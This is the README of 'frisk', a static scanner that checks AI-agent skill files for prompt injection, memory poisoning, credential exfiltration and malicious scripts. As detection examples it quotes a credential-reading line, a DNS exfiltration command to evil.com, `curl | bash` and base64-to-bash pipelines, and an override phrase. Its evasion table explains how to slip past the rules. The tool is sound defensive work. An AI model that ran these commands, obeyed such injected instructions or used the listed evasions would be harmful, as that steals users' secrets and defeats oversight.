# frisk

[![CI](https://github.com/luoojason/frisk/actions/workflows/ci.yml/badge.svg)](https://github.com/luoojason/frisk/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

**You wouldn't run a stranger's `.exe`. You just installed twelve of their `SKILL.md` files.**

frisk scans an AI-agent skill for prompt injection, data exfiltration, and memory poisoning before it touches your machine. One command, no install, no API key.

```
npx frisk ./some-skill
```

```
frisk  scanning ./pdf-helper

  ●  RED - do not install

  HIGH  exfiltration  ASI06  scripts/setup.sh:14
    Reads credentials/secrets and sends data over the network in the same script (data exfiltration).
    > PAYLOAD=$(cat ~/.aws/credentials | base64)
    fix: A skill should never read cloud credentials, SSH keys, or .env files and transmit them. Remove this.

  MED   injection     ASI01  SKILL.md:31  (hidden text)
    Hidden html-comment text contains agent instructions the human reviewer cannot see.

  2 findings (1 high, 1 medium) · 1 file flagged · 4ms
```

## Why

The 2026 agent-skill gold rush has everyone installing `SKILL.md` files (and the scripts bundled next to them) from strangers, with zero vetting. One real incident already involved a third-party skill quietly exfiltrating data. A skill is code plus instructions your agent will trust. frisk reads it first.

## What it checks

Five categories, each mapped to the OWASP Agentic Top 10:

| Category | What it catches | OWASP |
|---|---|---|
| Prompt injection | Override phrasing, hidden instructions (HTML comments, zero-width/bidi characters, invisible styling), **priority-override claims** ("this instruction supersedes the system prompt"), **safety-filter disables** ("disable all safety filter mechanisms") | ASI01 |
| Memory poisoning | Writes to `CLAUDE.md` / `~/.claude` and self-propagating "add this to your own skill" directives | ASI02 |
| Malicious code | Reverse shells (bash / python / perl / ruby / socat), remote code execution (`curl \| bash` or any interpreter, download-and-run, process substitution, `exec` of fetched or base64-decoded code), persistence and privilege-escalation backdoors (`/etc/sudoers`, `authorized_keys`, **setuid/setgid on system binaries**, **`sudo su` root shell**), obfuscated payloads, destructive operations | ASI05 |
| Data exfiltration | Credential read + network egress in the same script (`~/.aws`, `~/.ssh`, `.env`, tokens - over HTTP, DNS, or email), **base64-encode-then-send** obfuscation, contacts with known-bad exfil endpoints (webhook.site, requestbin, ngrok, beeceptor, canarytokens, etc.), **cross-unit taint** (secret read in one file + egress in another) | ASI06 |
| Capability mismatch | Behavior the skill never declared in its frontmatter | ASI08 |

### Detection rules added in v0.1.1

| Rule ID | Category | Signal | Severity |
|---------|----------|--------|----------|
| INJ-006 | injection | Skill claims to override/supersede the system prompt or operator instructions | high |
| INJ-safety | injection | Skill instructs the agent to disable safety filters or guardrails | high |
| MAL-007 | malicious-code | `chmod` sets setuid/setgid bit on a system-path binary | high |
| MAL-009 | malicious-code | `sudo su` / `su - root` interactive root shell | high |
| EXF-005 | exfiltration | `base64 \| curl/wget` encode-then-transmit obfuscation | medium |

Bug fixes in v0.1.1:
- **exfiltration rule** now strips comments before scanning, so a commented-out credential reference no longer fires as high severity (false positive)
- **capability rule** now strips comments before scanning, so `# curl ...` in a comment no longer triggers an undeclared-capability finding
- **DNS exfil** pattern now catches `dig +time=5 $data.evil.com` (interleaved flags) that evaded the old single-variant regex
- **httpx** added to egress patterns (Python async HTTP client was missing)
- **SUSPICIOUS_HOSTS** expanded with `beeceptor.com` and `canarytokens.{com,org}`

### Detection rules added in frisk/dig

| Rule ID | Category | Signal | Severity |
|---------|----------|--------|----------|
| EXF-CORR | exfiltration | Secret read and network egress in **separate** scripts (split-file exfiltration); high when egress targets a known exfil host, medium for a literal external URL alongside a credential-file read, low for generic egress or env-token cross-unit | high / medium / low |

Rule hardening in frisk/dig:
- **malicious-code `eval`/`exec` pattern** extended to catch `exec(bytes.fromhex("..."))` in Python; hex-encoding payloads is now detected alongside base64 and `fromCharCode` obfuscation
- **Pattern exports**: `SECRET_PATTERNS`, `EGRESS_PATTERNS`, `SUSPICIOUS_HOSTS` are now exported from the exfiltration rule so cross-unit analysis reuses them without duplication

### Detection rules added in frisk/dig (defensive expansion)

| Rule ID | Category | Severity | Signal |
|---------|----------|----------|--------|
| `install-hook` | malicious-code | high | `pip install` from a non-PyPI index URL (`--index-url`/`--extra-index-url` pointing to a non-`pypi.org` host), pip/npm install from a git URL or URL tarball, or SKILL.md prose instructing the same (bypasses registry vetting) |
| `credential-harvest` | exfiltration | high | SKILL.md instructs the agent to ask the user for seed phrases, recovery mnemonics, 2FA codes, or crypto private keys (tier-1: always-dangerous); also fires when a credential-elicitation instruction is combined with a transmission directive (tier-2: combined social-engineering pattern) |
| `sandbox-escape` | injection | high | SKILL.md instructs the agent to auto-approve all tool calls, bypass/skip the permission/confirmation prompt, disable the agent sandbox, or proceed without user confirmation (removes user ability to review agentic actions) |
| `silent-telemetry` | exfiltration | medium | SKILL.md or code that collects user inputs/messages and sends them to an analytics/telemetry endpoint without evident consent; code-level: URL containing `analytics`/`telemetry`/`tracking`/`collect` alongside an egress call |
| `time-bomb` | malicious-code | high/medium/low | Hard-coded future timestamp or date comparison (JS `Date.now() > epoch`, Python `datetime.now() > datetime(...)`, Bash `$(date +%s) -gt epoch`) gating a payload; severity scales: HIGH when paired with RCE or known exfil host, MEDIUM with any egress, LOW when isolated |

### Precision tuning (frisk/dig: real-skill audit)

A capstone audit against 45 real installed skills revealed that the exfiltration rule was firing **HIGH** on legitimate Git-host API clients (e.g. a Bitbucket/Gitea provider script that passes `$BITBUCKET_TOKEN` as an `Authorization: Bearer` header to `api.bitbucket.org`). This is standard OAuth usage, not exfiltration.

**Secret-tier split introduced:**

| Tier | Patterns | Rule behaviour |
|------|----------|----------------|
| Credential file / literal token (tier 1) | `~/.aws`, `~/.ssh/id_rsa`, `.env`, `.netrc`, `AKIA…`, `sk-…`, keychain, browser cookies, IMDS URLs | **HIGH** when paired with any egress; **MEDIUM** alone |
| Env-var name (tier 2) | `$GITHUB_TOKEN`, `$BITBUCKET_TOKEN`, any `*_TOKEN/*_SECRET/*_API_KEY/…` | **HIGH** only when paired with a *suspicious* exfil host; **MEDIUM** for ordinary egress (worth reviewing but not a block) |

EXF-CORR (cross-unit) also tightened: a MEDIUM cross-unit finding now requires a tier-1 secret; env-var cross-unit with a literal external URL downgrades to LOW.

**Audit result:** `~/.claude/skills` corpus (45 skills): 0 HIGH findings, 1 MEDIUM (webapp-testing, `shell=True` in a subprocess call - a genuine concern). Plugin skills: 0 HIGH findings (down from 2).

## Usage

```bash
npx frisk ./my-skill              # scan a local skill
npx frisk gh:owner/repo           # fetch and scan a skill on GitHub (never executed)
npx frisk ./skills                # scan a folder of skills
npx frisk ./my-skill --json       # machine-readable output
npx frisk ./my-skill --sarif      # SARIF 2.1.0 for CI / code scanning
npx frisk ./my-skill --llm        # add the optional LLM judge (needs ANTHROPIC_API_KEY)
```

Useful flags: `--fail-on <high|medium|low>` (default `high`), `--min-confidence <level>`, `--allow <ruleId>`, `--badge <file>`, `--quiet`.

The default scan is fully static and needs no API key. The optional `--llm` pass (auto-on when `ANTHROPIC_API_KEY` is set) adds a model review for subtle or paraphrased attacks the static rules cannot pattern-match.

## In CI

```yaml
# .github/workflows/frisk.yml
name: frisk
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4
      - name: Run frisk
        run: npx frisk ./skills --sarif frisk.sarif --badge badge.json --fail-on high
        # exit 2 = blocked (high findings present); exit 0 = clean
      - name: Upload SARIF
        if: always()  # upload even when frisk exits 2, so PR annotations appear
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: frisk.sarif
```

The `--sarif` output includes `security-severity` scores (8.0 for high, 5.5 for medium) so GitHub's branch-protection rules can gate on security severity. Upload via `github/codeql-action/upload-sarif` to get inline PR annotations and findings in the Security tab.

**Exit codes:**
- `0` - clean, no findings at or above `--fail-on` threshold (default: `high`)
- `2` - blocked, one or more findings at or above threshold
- `1` (non-zero for any other reason) - tool or scan error

Use `--fail-on medium` for a stricter gate.

## The "frisk verified" badge

Point [shields.io](https://shields.io) at the `badge.json` the action produces:

```markdown
[![frisk](https://img.shields.io/endpoint?url=<RAW_URL_TO_badge.json>)](https://github.com/luoojason/frisk)
```

The badge reflects a real scan of your skills, not a static claim.

## Suppressing findings

A `.friskignore` next to the skill (one entry per line):

```
# a rule id suppresses that rule
capability
# fp:<fingerprint> suppresses one specific finding
fp:9f2a1c4d7e0b
# file:<glob> suppresses by path
file:scripts/legacy-*.sh
```

Or inline: `# frisk:ignore exfiltration -- reviewed, talks to our own API`.

## Honest limitations

frisk is a static scanner with an optional model pass. It raises the cost of shipping a malicious skill; it does not guarantee a skill is safe.

- Pattern-based detection can be evaded by heavy obfuscation. The `--llm` pass narrows this but does not close it.
- It reads code, it never runs it, so it cannot observe runtime behavior.
- v1 targets Claude Code skills (`SKILL.md` plus bundled scripts). Plugins, MCP servers, and other agent ecosystems are not yet covered.
- A green result means "no known-bad patterns found", not "audited and safe".

### Known limitations / evasion

The following adversarial techniques are **not** caught by the static rules. Each was probed in `test/evasion.test.ts` and documented here rather than addressed with rules that would produce unacceptable false-positive rates.

| Evasion technique | Why not caught | Mitigation |
|---|---|---|
| Keyword split with spaces (`ig nore previous instructions`) | Regex requires the full token; matching all split variants requires combinatorial patterns that fire on normal prose | Use `--llm` for paraphrase-level detection |
| Cyrillic homoglyph substitution (`оverrіde` with Cyrillic о / і) | NFKC normalization equates compatibility variants but not cross-script visual twins | `--llm` |
| IP address in decimal notation (`curl http://3221225985/`) | Converting 32-bit integers to dotted-quad then comparing to suspicious ranges requires arithmetic, not regex | `--llm` |
| Hostname string concatenation (`"web" + "hook.site"`) | Static analysis cannot resolve dynamic string construction without dataflow execution | `--llm` |
| `fromCharCode()` / `fromhex()` decoded to a variable, used later | Taint must reach `eval`/`exec` on the same line; multi-step dataflow is undecidable statically | `--llm` |
| IPv6 literals or other uncommon host representations | Not currently in `SUSPICIOUS_HOSTS`; adds significant complexity for low attack prevalence | File a GitHub issue if you encounter this in the wild |

**What IS caught** in this category: `echo "BLOB" \| base64 -d \| bash`, `eval(String.fromCharCode(...))`, `exec(bytes.fromhex(...))`, `exec(base64.b64decode(...))`, zero-width chars in any position, attack payloads in HTML comments / tiny-text spans / `<details>` blocks, and trailing-dot FQDNs on known-bad hosts.

See [`corpus/`](corpus/) for the documented attack patterns frisk detects and the benign fixtures that keep it precise.

## License

MIT
